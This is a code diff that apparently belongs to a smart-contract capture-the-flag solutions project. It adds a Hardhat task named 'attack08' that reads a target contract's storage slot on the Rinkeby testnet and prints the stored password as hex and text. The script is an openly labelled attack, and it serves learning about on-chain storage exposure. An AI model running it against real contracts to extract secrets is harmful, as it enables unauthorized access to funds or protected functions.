@@ -29,6 +29,15 @@ task("balance", "Prints an account's balance")
     console.log(hre.web3.utils.fromWei(balance, "ether"), "ETH");
   });
 
+// npx hardhat --network rinkeby --contract {address}
+task("attack08", "Attacks the contract")
+  .addParam("contract", "The contract's address")
+  .setAction(async (taskArgs, hre) => {
+    const passwd = await hre.web3.eth.getStorageAt(taskArgs.contract, 1);
+    console.log("The password in hex: ", passwd);
+    console.log("The password readable: ", hre.web3.utils.hexToAscii(passwd));
+  });
+
 // You need to export an object to set up your config
 // Go to https://hardhat.org/config/ to learn more
 
